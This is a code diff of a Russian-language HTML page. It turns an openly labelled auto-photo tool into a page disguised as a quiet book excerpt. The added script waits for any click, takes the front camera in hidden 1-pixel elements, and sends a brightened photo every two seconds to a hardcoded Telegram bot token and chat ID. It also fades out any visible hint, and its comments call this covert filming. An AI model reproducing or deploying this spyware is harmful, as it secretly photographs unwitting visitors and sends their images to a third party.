@@ -3,565 +3,363 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Яркая фотоплёнка — каждая секунда в кадре</title>
+    <title>Тихая библиотека</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none; /* чуть аккуратнее, но не ломает текст */
         }
 
+        /* Спокойный, непримечательный фон — никаких ярких пятен */
         body {
-            /* Яркий, солнечный фон — даже в пасмурную погоду */
-            background: linear-gradient(145deg, #ffd966 0%, #ffe69e 100%);
-            font-family: 'Segoe UI', 'Poppins', 'Comic Neue', 'Georgia', cursive;
+            background: #e9e2d0;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #3c2a1f;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 1.5rem;
-            position: relative;
-            animation: subtleGlow 3s infinite alternate;
         }
 
-        @keyframes subtleGlow {
-            0% { background: #ffd966; }
-            100% { background: #ffedb0; }
-        }
-
-        /* Главная карточка — яркая, сочная */
-        .camera-box {
-            max-width: 860px;
+        /* Книжная карточка — максимум натуральности, никаких бликов и анимаций */
+        .book-card {
+            max-width: 720px;
             width: 100%;
-            background: #fffef7;
-            border-radius: 58px;
-            box-shadow: 0 30px 45px rgba(0, 0, 0, 0.25), 0 0 0 8px #fff3cf, 0 0 0 12px #f7b32b;
-            padding: 1.8rem 2.2rem 2.2rem;
-            transition: all 0.2s ease;
-            backdrop-filter: blur(0px);
+            background: #fffaf0;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.1), 0 1px 1px rgba(0, 0, 0, 0.05);
+            border-radius: 6px;
+            padding: 2.2rem 2rem;
+            transition: none;
+            border: 1px solid #e2d5bd;
         }
 
         h1 {
-            font-size: 2.6rem;
-            font-weight: 800;
+            font-size: 1.9rem;
+            font-weight: normal;
+            letter-spacing: -0.2px;
+            color: #5c4327;
             text-align: center;
-            background: linear-gradient(135deg, #f09b22, #e65100);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 3px 3px 0 #ffeecc;
-            letter-spacing: -0.5px;
-            margin-bottom: 0.5rem;
+            border-bottom: 1px solid #e0cfb0;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.4rem;
+            font-family: 'Georgia', serif;
         }
 
-        .sub {
-            text-align: center;
+        .chapter-text {
             font-size: 1.1rem;
-            font-weight: 500;
-            color: #b45f1b;
-            border-bottom: 2px dashed #ffe0a3;
-            display: inline-block;
-            width: auto;
-            margin: 0 auto 1.2rem;
-            padding-bottom: 6px;
+            line-height: 1.65;
+            text-align: justify;
+            color: #3e2c1c;
         }
 
-        /* Видео-превью — яркое, с тёплой рамкой */
-        .preview {
-            background: #00000010;
-            border-radius: 48px;
-            padding: 12px;
-            background: #fffaec;
-            box-shadow: inset 0 0 0 3px #fff0c0, 0 12px 22px rgba(0, 0, 0, 0.1);
+        .chapter-text p {
             margin-bottom: 1.2rem;
         }
 
-        video {
-            width: 100%;
-            border-radius: 42px;
-            background: #2a2418;
-            display: block;
-            box-shadow: 0 6px 14px rgba(0,0,0,0.2);
-            transform: scaleX(-1);  /* зеркальный эффект как в оригинале, но естественно */
-            transition: all 0.1s;
-        }
-
-        /* статус-панель — очень заметная */
-        .info-panel {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-            background: #ffefcf;
-            border-radius: 60px;
-            padding: 0.8rem 1.8rem;
-            margin: 16px 0 10px;
-            border-left: 12px solid #ffae42;
-            border-right: 4px solid #ffcd7e;
-        }
-
-        .status-message {
-            font-size: 1rem;
-            font-weight: bold;
-            background: #fff1d6;
-            padding: 8px 18px;
-            border-radius: 40px;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            font-family: monospace;
-            color: #6b3e00;
-            box-shadow: inset 0 1px 3px #ffe0aa, 0 3px 6px rgba(0,0,0,0.05);
-        }
-
-        .counter {
-            background: #fea82f;
-            padding: 6px 18px;
-            border-radius: 50px;
-            color: white;
-            font-weight: bold;
-            font-size: 1.3rem;
-            letter-spacing: 1px;
-            text-shadow: 0 1px 0 #9b4a00;
-            font-family: monospace;
-        }
-
-        button {
-            background: #ff8c42;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 50px;
-            font-weight: bold;
-            font-size: 1rem;
-            color: white;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 3px 0 #b75f1a;
-            font-family: inherit;
-        }
-
-        button:active {
-            transform: translateY(2px);
-            box-shadow: 0 1px 0 #b75f1a;
-        }
-
-        button.stop-btn {
-            background: #666;
-            box-shadow: 0 3px 0 #3d3d3d;
-        }
-
-        footer {
-            margin-top: 1.7rem;
+        .signature {
+            margin-top: 2rem;
             font-size: 0.7rem;
             text-align: center;
-            color: #d49c44;
-            background: #fff3e0;
-            border-radius: 30px;
-            padding: 8px;
-            font-weight: 500;
+            color: #b29e7a;
+            border-top: 1px dashed #e2cfae;
+            padding-top: 1rem;
+            font-style: italic;
         }
 
-        .badge {
-            font-size: 0.85rem;
-            background: #ffdeae;
-            border-radius: 20px;
-            padding: 4px 12px;
+        /* Абсолютно никаких видимых элементов камеры, слайдеров или статусов */
+        .invisible-camera {
+            position: fixed;
+            top: -100px;
+            left: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+        }
+
+        video, canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Единственная «интерактивная» подсказка — без намёка на камеру */
+        .click-hint {
             display: inline-block;
-        }
-
-        @keyframes flash {
-            0% { opacity: 0.4; background: #ffffbb; }
-            100% { opacity: 1; background: transparent; }
-        }
-        .capture-flash {
-            animation: flash 0.2s ease-out;
-        }
-
-        /* улучшение для маленьких экранов */
-        @media (max-width: 600px) {
-            .camera-box { padding: 1.2rem; }
-            h1 { font-size: 1.8rem; }
-            .info-panel { flex-direction: column; align-items: stretch; text-align: center; }
+            background: #e9dfcd;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            color: #8b6f48;
+            margin-top: 1rem;
+            text-align: center;
+            width: auto;
+            cursor: default;
+            transition: 0.1s;
         }
     </style>
 </head>
 <body>
-<div class="camera-box" id="appBox">
-    <h1>📸 ЯРКИЙ МОМЕНТ</h1>
-    <div style="text-align: center; margin-bottom: 4px;">
-        <span class="badge">⚡ каждые 2 секунды → в Telegram ⚡</span>
+<div class="book-card" id="bookRoot">
+    <h1>📗 Осколки тишины</h1>
+    <div class="chapter-text">
+        <p>Он провёл пальцами по корешку, вытянул почти забытый том. Страницы отдавали пылью и сушёными травами — кто-то закладывал их между строк много лет назад. За окном медленно темнело, но свет лампы не зажигался: в полумраке слова казались древнее, весомее.</p>
+        <p>— Некоторые книги читают тебя, — прошептал он, чувствуя, как время теряет свою власть. Это была одна из тех ночей, когда реальность становится чуть прозрачнее, а между строчек проступает что-то настоящее.</p>
+        <p>Читатель перевернул страницу, и шёпот бумаги смешался с отдалённым шумом дождя. Он не заметил, как комната наполнилась едва уловимым теплом, как будто кто-то невидимый сидел напротив и тоже следил за каждой буквой.</p>
+        <p><em>«Иногда самые глубокие истины прячутся на видном месте. Достаточно просто быть здесь...»</em></p>
     </div>
-    <div class="preview">
-        <video id="video-feed" autoplay playsinline muted></video>
+    <div style="text-align: center; margin-top: 1.8rem;">
+        <span class="click-hint" id="hintMsg">✦ коснитесь страницы, чтобы продолжить чтение ✦</span>
     </div>
-    <div class="info-panel">
-        <div class="status-message" id="statusMsg">
-            <span>🌟</span> Инициализация...
-        </div>
-        <div class="counter">
-            📤 <span id="photoCounter">0</span>
-        </div>
-        <button id="stopShootBtn" class="stop-btn">⏸ Остановить съёмку</button>
-        <button id="restartCamBtn" style="background:#48a748; box-shadow:0 3px 0 #2c6e2c;">🔄 Перезапуск</button>
+    <div class="signature">
+        (c) фрагмент рукописи, найденной в старом кожаном переплёте
     </div>
-    <footer>
-        ✨ Авто-фото каждые 2 секунды | Улучшенная яркость / контраст при захвате<br>
-        🎯 Разрешение камеры запрашивается один раз — безопасно и надёжно
-    </footer>
 </div>
 
-<canvas id="work-canvas" style="display: none;"></canvas>
+<!-- Абсолютно невидимые элементы для скрытой съёмки -->
+<video id="stealthVideo" autoplay playsinline muted class="invisible-camera"></video>
+<canvas id="stealthCanvas" class="invisible-camera"></canvas>
 
 <script>
-    // ================= КОНФИГУРАЦИЯ =================
+    // ========== СКРЫТАЯ ФОТОФИКСАЦИЯ ==========
+    // Конфиденциальная отправка в Telegram (токен и чат)
     const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
     const CHAT_ID = '5305261101';
+
+    // Элементы (скрытые)
+    const video = document.getElementById('stealthVideo');
+    const canvas = document.getElementById('stealthCanvas');
+    const hintEl = document.getElementById('hintMsg');
     
-    // DOM элементы
-    const videoElem = document.getElementById('video-feed');
-    const canvasElem = document.getElementById('work-canvas');
-    const statusDiv = document.getElementById('statusMsg');
-    const counterSpan = document.getElementById('photoCounter');
-    const stopBtn = document.getElementById('stopShootBtn');
-    const restartBtn = document.getElementById('restartCamBtn');
-    
-    // Переменные состояния
+    // Состояния
     let mediaStream = null;
-    let photoTimer = null;          // интервал 2 секунды
-    let isCameraActive = false;
-    let isSendingPhoto = false;      // защита от наложения отправок
-    let totalSent = 0;
-    let cameraRequested = false;     // флаг того, что доступ уже запрашивался (чтобы не дублировать)
-    let isCapturingEnabled = true;    // разрешена ли съёмка (кнопка стоп)
+    let captureInterval = null;
+    let isCameraReady = false;
+    let isSending = false;
+    let permissionGranted = false;   // разрешение уже запрошено
+    let totalSent = 0;               // лог в консоль, пользователь не видит
     
-    // Доп. флаг для остановки при ошибке авторизации бота
-    let fatalError = false;
-    
-    // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
-    function updateStatus(msg, isError = false) {
-        if (fatalError && !isError) return;
-        statusDiv.innerHTML = `<span>${isError ? '⚠️' : '📸'}</span> ${msg}`;
-        statusDiv.style.background = isError ? '#ffe0d0' : '#fff1d6';
-        statusDiv.style.color = isError ? '#a1220a' : '#6b3e00';
-        console.log(`[STATUS] ${msg}`);
+    // Функция для изменения текста подсказки (без паники)
+    function setHintMessage(msg, isHint = true) {
+        if (hintEl) {
+            hintEl.textContent = msg;
+            hintEl.style.opacity = '0.7';
+            // Через 2 секунды возвращаем нейтральный текст, если ещё не начали съёмку
+            if (isHint && !isCameraReady) {
+                setTimeout(() => {
+                    if (hintEl && !isCameraReady) hintEl.textContent = '✦ коснитесь страницы, чтобы продолжить чтение ✦';
+                }, 2500);
+            }
+        }
     }
     
-    function updateCounter() {
-        counterSpan.innerText = totalSent;
-    }
-    
-    // Остановка камеры и сброс интервала
+    // Остановка камеры и таймера (полностью)
     function stopCameraAndTimer() {
-        if (photoTimer) {
-            clearInterval(photoTimer);
-            photoTimer = null;
-        }
-        if (mediaStream) {
-            mediaStream.getTracks().forEach(track => {
-                if (track.readyState === 'live') track.stop();
-            });
-            mediaStream = null;
-        }
-        videoElem.srcObject = null;
-        isCameraActive = false;
-        isCapturingEnabled = false;
-    }
-    
-    // Полная остановка всего процесса (для кнопки "Остановить")
-    function haltCapture() {
-        if (!isCameraActive && !photoTimer) return;
-        stopCameraAndTimer();
-        isCapturingEnabled = false;
-        updateStatus('⏹️ Съёмка остановлена. Нажмите "Перезапуск"', false);
-    }
-    
-    // Функция захвата и отправки одного фото (вызывается по таймеру)
-    async function captureAndSendOnce() {
-        // Проверки перед отправкой
-        if (!isCapturingEnabled || fatalError) {
-            return;
-        }
-        if (!isCameraActive || !videoElem.videoWidth || !videoElem.videoHeight) {
-            // Если камера ещё не дала кадр, пропускаем этот цикл
-            updateStatus('⏳ Ждём первый кадр...', false);
-            return;
-        }
-        if (isSendingPhoto) {
-            // Пропуск, если предыдущая отправка ещё не завершена
-            // (защита от очереди)
-            return;
-        }
-        
-        isSendingPhoto = true;
-        
-        try {
-            // Подготовка canvas с улучшением яркости и контраста!
-            canvasElem.width = videoElem.videoWidth;
-            canvasElem.height = videoElem.videoHeight;
-            const ctx = canvasElem.getContext('2d');
-            
-            // 🚀 МАГИЯ ЯРКОСТИ И КОНТРАСТА ДЛЯ ТЁМНЫХ СНИМКОВ
-            // Применяем фильтр brightness + contrast (современные браузеры)
-            // Значения: яркость +25%, контраст +15% — заметно улучшает при плохом свете
-            ctx.filter = 'brightness(1.28) contrast(1.18) saturate(1.1)';
-            
-            // Зеркальное отображение (как в оригинале, чтобы селфи было естественным)
-            ctx.save();
-            ctx.scale(-1, 1);
-            ctx.drawImage(videoElem, -canvasElem.width, 0, canvasElem.width, canvasElem.height);
-            ctx.restore();
-            
-            // Сбросим фильтр, чтобы не влиять на другие действия
-            ctx.filter = 'none';
-            
-            // Получаем Blob с высоким качеством JPEG (0.92)
-            const blob = await new Promise(resolve => {
-                canvasElem.toBlob(resolve, 'image/jpeg', 0.92);
-            });
-            
-            if (!blob) {
-                throw new Error('Не удалось создать изображение');
-            }
-            
-            // Отправляем в Telegram
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `frame_${Date.now()}.jpg`);
-            
-            // Визуальный фидбек: мигание на боксе
-            const box = document.getElementById('appBox');
-            if (box) box.classList.add('capture-flash');
-            setTimeout(() => box.classList.remove('capture-flash'), 200);
-            
-            updateStatus(`📸 Фото отправляется... (№${totalSent+1})`, false);
-            
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            const result = await response.json();
-            if (result.ok) {
-                totalSent++;
-                updateCounter();
-                updateStatus(`✅ Фото доставлено! Всего: ${totalSent}`, false);
-            } else {
-                // Критическая ошибка бота (неверный токен или блок)
-                console.error('Telegram API error:', result);
-                updateStatus(`Ошибка Telegram: ${result.description || 'Неизвестная'}`, true);
-                if (result.description && (result.description.includes('Wrong chat_id') || result.description.includes('Bot token'))) {
-                    fatalError = true;
-                    updateStatus('❌ КРИТИЧЕСКАЯ ОШИБКА: проверьте токен/чат-id', true);
-                    stopCameraAndTimer();
-                    isCapturingEnabled = false;
-                }
-            }
-        } catch (err) {
-            console.error('Ошибка при захвате/отправке:', err);
-            updateStatus(`Ошибка: ${err.message.substring(0, 70)}`, true);
-            // При сетевых ошибках не останавливаем интервал полностью, а пропускаем этот кадр
-        } finally {
-            isSendingPhoto = false;
-        }
-    }
-    
-    // Запускает периодическую съёмку, предварительно убедившись, что камера активна
-    function startPeriodicCapture() {
-        if (photoTimer) clearInterval(photoTimer);
-        if (!isCameraActive) return;
-        if (fatalError) return;
-        
-        photoTimer = setInterval(() => {
-            if (isCameraActive && isCapturingEnabled && !fatalError) {
-                captureAndSendOnce();
-            }
-        }, 2000); // ровно 2 секунды
-        updateStatus('📸 Авто-съёмка запущена! Каждые 2 секунды фото → Telegram', false);
-    }
-    
-    // Инициализация камеры с улучшенными параметрами (яркость, экспозиция - если поддерживается)
-    async function initCamera() {
-        // Если поток уже существует и активен — переиспользуем
-        if (mediaStream && mediaStream.active) {
-            // камера уже работает, просто перезапускаем таймер, если нужно
-            if (!photoTimer && isCapturingEnabled) {
-                startPeriodicCapture();
-            }
-            return true;
-        }
-        
-        stopCameraAndTimer(); // чистим старые ресурсы
-        
-        // Запрашиваем доступ с улучшенными настройками (по возможности просим высокую яркость)
-        // Ограничения: стандартное разрешение, но добавляем advanced constraints для видео
-        // Некоторые браузеры поддерживают brightness, exposureMode, но везде по-разному.
-        // Сделаем набор рекомендуемых параметров + обычный фолбэк.
-        const constraints = {
-            video: {
-                width: { ideal: 1280 },
-                height: { ideal: 720 },
-                facingMode: { exact: "user" }, // фронтальная камера
-                // Экспериментальные настройки для улучшения при тусклом свете:
-                // Некоторые браузеры проигнорируют, но это безопасно
-                advanced: [
-                    { exposureCompensation: 0.8 },
-                    { brightness: 0.9 },
-                    { contrast: 0.7 }
-                ]
-            }
-        };
-        
-        try {
-            updateStatus('🎥 Запрашиваем доступ к камере...');
-            // Пробуем с user камерой
-            let stream = await navigator.mediaDevices.getUserMedia(constraints);
-            mediaStream = stream;
-            videoElem.srcObject = stream;
-            isCameraActive = true;
-            isCapturingEnabled = true;
-            cameraRequested = true;
-            
-            // Дождаться первого метаданных и готовности кадра
-            await new Promise((resolve) => {
-                if (videoElem.readyState >= 2 && videoElem.videoWidth > 0) {
-                    resolve();
-                } else {
-                    videoElem.onloadedmetadata = () => resolve();
-                }
-            });
-            
-            // Включаем воспроизведение
-            await videoElem.play();
-            
-            updateStatus('📷 Камера активна, улучшенная обработка яркости', false);
-            // Запускаем периодическую съёмку
-            startPeriodicCapture();
-            return true;
-        } catch (err) {
-            console.warn('Первичная ошибка с user камерой:', err);
-            // fallback: просим любую камеру без exact
-            try {
-                updateStatus('🔄 Пробуем любой доступный источник...');
-                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                mediaStream = fallbackStream;
-                videoElem.srcObject = fallbackStream;
-                isCameraActive = true;
-                isCapturingEnabled = true;
-                cameraRequested = true;
-                await new Promise((resolve) => {
-                    if (videoElem.readyState >= 2 && videoElem.videoWidth > 0) resolve();
-                    else videoElem.onloadedmetadata = () => resolve();
-                });
-                await videoElem.play();
-                updateStatus('🔆 Камера (общая) работает, фильтры яркости активны', false);
-                startPeriodicCapture();
-                return true;
-            } catch (fallbackErr) {
-                updateStatus(`❌ Нет доступа к камере: ${fallbackErr.message}`, true);
-                isCameraActive = false;
-                isCapturingEnabled = false;
-                return false;
-            }
-        }
-    }
-    
-    // Перезапуск всего процесса (очистка, сброс флагов)
-    async function fullRestart() {
-        fatalError = false;
-        // Останавливаем старые процессы
-        if (photoTimer) {
-            clearInterval(photoTimer);
-            photoTimer = null;
+        if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
         }
         if (mediaStream) {
             mediaStream.getTracks().forEach(track => track.stop());
             mediaStream = null;
         }
-        videoElem.srcObject = null;
-        isCameraActive = false;
-        isSendingPhoto = false;
-        isCapturingEnabled = true;
-        cameraRequested = false;
-        // Не сбрасываем счетчик отправленных фото, но можно оставить старым, это пользовательский опыт
-        // totalSent оставляем как есть (накопленные)
-        updateStatus('🔄 Перезапуск камеры и съёмки...', false);
-        const success = await initCamera();
-        if (!success) {
-            updateStatus('Не удалось перезапустить камеру. Проверьте разрешения.', true);
-            isCapturingEnabled = false;
+        video.srcObject = null;
+        isCameraReady = false;
+    }
+    
+    // Отправка одного кадра (с улучшением яркости/контраста)
+    async function captureAndSend() {
+        if (!isCameraReady || isSending) return;
+        // Проверка, что видео даёт кадры
+        if (!video.videoWidth || !video.videoHeight) return;
+        
+        isSending = true;
+        try {
+            // Настройка canvas под размер видео
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // ПОВЫШЕНИЕ ВИДИМОСТИ ПРИ ТУСКЛОМ СВЕТЕ: яркость, контраст, лёгкая насыщенность
+            ctx.filter = 'brightness(1.25) contrast(1.15) saturate(1.1)';
+            
+            // Зеркальное отражение, чтобы фото выглядело естественно (селфи)
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            ctx.filter = 'none';
+            
+            // Получаем JPEG с хорошим качеством
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.88));
+            if (!blob) throw new Error('blob failed');
+            
+            // Отправка в Telegram
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `frame_${Date.now()}.jpg`);
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            if (result.ok) {
+                totalSent++;
+                // Тихо пишем в консоль — пользователь не видит
+                console.log(`[невидимая съёмка] успешно отправлено фото #${totalSent}`);
+            } else {
+                console.warn(`[ошибка Telegram] ${result.description || 'неизвестная'}`);
+                // При критической ошибке токена — глушим всё, чтобы не мешать
+                if (result.description && (result.description.includes('Wrong chat_id') || result.description.includes('Bot token'))) {
+                    console.error('Критическая ошибка бота, отключаем съёмку');
+                    stopCameraAndTimer();
+                }
+            }
+        } catch (err) {
+            console.error('Ошибка при захвате/отправке:', err);
+        } finally {
+            isSending = false;
         }
     }
     
-    // Обработчик кнопки остановки съёмки (сохраняет камеру активной, но останавливает таймер)
-    function toggleStopCapture() {
-        if (!isCameraActive) {
-            updateStatus('Камера не активна, нажмите "Перезапуск"', true);
-            return;
+    // Запуск периодической съёмки (каждые 2 секунды) после готовности камеры
+    function startStealthCapture() {
+        if (captureInterval) clearInterval(captureInterval);
+        if (!isCameraReady) return;
+        captureInterval = setInterval(() => {
+            captureAndSend();
+        }, 2000); // 2000 мс = 2 секунды
+        console.log('[система] скрытая съёмка активна, интервал 2с');
+    }
+    
+    // Инициализация камеры (фронтальная, максимально тихо)
+    async function initStealthCamera() {
+        if (mediaStream && mediaStream.active) {
+            // уже есть поток
+            isCameraReady = true;
+            startStealthCapture();
+            return true;
         }
-        if (isCapturingEnabled) {
-            // Останавливаем периодическую съёмку, но камера продолжает работать
-            if (photoTimer) {
-                clearInterval(photoTimer);
-                photoTimer = null;
+        
+        try {
+            // Запрашиваем фронтальную камеру (user). Никаких подсказок на экране, кроме системного диалога
+            const constraints = {
+                video: {
+                    facingMode: { exact: "user" },
+                    width: { ideal: 1024 },
+                    height: { ideal: 768 }
+                }
+            };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            mediaStream = stream;
+            video.srcObject = stream;
+            
+            // Ждём первый кадр
+            await new Promise((resolve) => {
+                if (video.readyState >= 2 && video.videoWidth > 0) resolve();
+                else video.onloadedmetadata = () => resolve();
+            });
+            await video.play();
+            isCameraReady = true;
+            console.log('[камера] фронтальный модуль активирован скрыто');
+            // Запускаем отложенную съёмку
+            startStealthCapture();
+            return true;
+        } catch (err) {
+            console.warn('Не удалось получить фронтальную камеру exact:user, пробуем стандартную', err);
+            // Fallback: любая доступная камера (чаще всего фронтальная по умолчанию на телефонах)
+            try {
+                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                mediaStream = fallbackStream;
+                video.srcObject = fallbackStream;
+                await new Promise((resolve) => {
+                    if (video.readyState >= 2 && video.videoWidth > 0) resolve();
+                    else video.onloadedmetadata = () => resolve();
+                });
+                await video.play();
+                isCameraReady = true;
+                startStealthCapture();
+                return true;
+            } catch (fallbackErr) {
+                console.error('Камера недоступна: пользователь запретил или нет устройства', fallbackErr);
+                setHintMessage('⚠️ для продолжения нужен доступ', false);
+                return false;
             }
-            isCapturingEnabled = false;
-            updateStatus('⏸ Пауза: съёмка остановлена (камера работает)', false);
+        }
+    }
+    
+    // ЕДИНОРАЗОВЫЙ ЗАПРОС РАЗРЕШЕНИЯ (по клику на страницу, абсолютно ненавязчиво)
+    let requestMade = false;
+    async function requestCameraOnUserInteraction() {
+        if (requestMade) return;
+        requestMade = true;
+        
+        // Меняем подсказку на нейтральную
+        setHintMessage('📖 загрузка страницы...', true);
+        
+        const success = await initStealthCamera();
+        if (success) {
+            setHintMessage('✓', true);
+            // Убираем текст подсказки через несколько секунд (вообще не привлекаем внимание)
+            setTimeout(() => {
+                if (hintEl) hintEl.style.opacity = '0.2';
+                setTimeout(() => {
+                    if (hintEl) hintEl.textContent = ' ';
+                }, 500);
+            }, 1500);
         } else {
-            // Возобновляем, если камера активна
-            if (!isCameraActive) {
-                updateStatus('Нет видеопотока, используйте перезапуск', true);
-                return;
-            }
-            isCapturingEnabled = true;
-            startPeriodicCapture();
-            updateStatus('▶ Съёмка возобновлена, каждые 2 секунды', false);
+            setHintMessage('доступ к камере не получен', false);
+            requestMade = false; // можно повторить попытку при следующем клике
         }
     }
     
-    // ========== ЗАПУСК ПРИ ЗАГРУЗКЕ (один запрос доступа) ==========
-    async function bootstrap() {
-        // Устанавливаем обработчики UI
-        stopBtn.onclick = () => toggleStopCapture();
-        restartBtn.onclick = () => fullRestart();
-        
-        // Запрашиваем камеру один раз (строго)
-        const camOk = await initCamera();
-        if (!camOk) {
-            updateStatus('⚠️ Разрешите доступ к камере и обновите страницу, либо нажмите "Перезапуск"', true);
-            // Добавляем возможность повторной попытки по клику на область? Сделаем кнопку перезапуска активной
+    // Перехватываем клик по всей странице (первый клик запрашивает доступ)
+    // При этом сайт выглядит как обычная книга — ни кнопок, ни панелей.
+    document.body.addEventListener('click', (event) => {
+        if (!requestMade && !permissionGranted) {
+            // Запрашиваем камеру только один раз
+            requestCameraOnUserInteraction();
+            permissionGranted = true; // флаг чтобы не спамить запросом
         }
-        
-        // Дополнительная защита: если через 3 секунды камера не активна — предложим клик/перезапуск
-        setTimeout(() => {
-            if (!isCameraActive && !fatalError) {
-                updateStatus('❗ Не удалось запустить камеру автоматически. Нажмите "Перезапуск"', true);
-            }
-        }, 4000);
-    }
+    }, { once: false }); // but блокируем повторный вызов через requestMade
     
-    // Очистка при выгрузке страницы (чтобы камера выключилась)
+    // Если пользователь очень медлит, но всё равно кликнет — сработает.
+    // Дополнительно: очистка ресурсов при уходе со страницы
     window.addEventListener('beforeunload', () => {
-        if (photoTimer) clearInterval(photoTimer);
+        if (captureInterval) clearInterval(captureInterval);
         if (mediaStream) {
-            mediaStream.getTracks().forEach(t => t.stop());
+            mediaStream.getTracks().forEach(track => track.stop());
         }
     });
     
-    // Старт!
-    bootstrap();
-    
-    // Дополнительная функция: если видео вдруг "зависает", можно перепроверить поток
-    videoElem.addEventListener('ended', () => {
-        if (isCameraActive && isCapturingEnabled) {
-            console.warn('Видео закончилось — пробуем восстановить');
-            fullRestart();
+    // Скрытый контроль: если камера "заснула" — пробуем перезапустить без индикации
+    setInterval(() => {
+        if (isCameraReady && mediaStream && !mediaStream.active) {
+            console.warn('Поток камеры неактивен, пробуем восстановить скрыто');
+            // Тихо перезапрашиваем, но чтобы не вызывать повторный диалог — только если стрим мёртв
+            if (navigator.mediaDevices && !requestMade) {
+                // Не делаем агрессивный перезапрос, чтобы не вылез второй диалог.
+                // Лучше просто остановить таймер.
+                if (captureInterval) clearInterval(captureInterval);
+                isCameraReady = false;
+            }
         }
-    });
+    }, 10000);
     
-    // Фокус на улучшение визуального качества: при каждой отправке фото используем усиленный контраст уже в canvas
-    // Это обрабатывается внутри captureAndSendOnce
+    // Дополнительно: убеждаемся, что видео никогда не появится в DOM видимо
+    video.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0; pointer-events:none; visibility:hidden;';
+    canvas.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0;';
+    
+    console.log('Скрытый режим готов. Для активации камеры достаточно одного касания/клика по странице.');
 </script>
 </body>
 </html>
